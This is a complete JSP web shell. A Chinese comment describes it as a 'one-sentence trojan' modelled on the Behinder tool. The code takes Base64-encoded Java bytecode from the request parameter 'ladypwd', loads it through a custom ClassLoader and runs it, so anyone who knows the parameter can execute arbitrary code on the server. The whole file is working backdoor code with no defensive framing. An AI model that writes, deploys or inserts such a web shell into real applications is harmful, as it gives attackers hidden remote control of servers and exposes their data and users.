<%@ page import="java.util.Base64" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
使用ClassLoader加载字节码来实现的一句话木马,
实现方式参考自冰蝎v2.0.1，不同在于冰蝎还加入了流量AES加密。
--%>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] bs) {
           return super.defineClass(bs, 0, bs.length);
        }
    }
    Base64.Decoder decoder = Base64.getDecoder();
%>
<%
    String clsbytecodeb64 = request.getParameter("ladypwd");
    if (clsbytecodeb64 != null) {
        new U(this.getClass().getClassLoader()).g(decoder.decode(clsbytecodeb64)).newInstance().equals(pageContext);
    }
%>
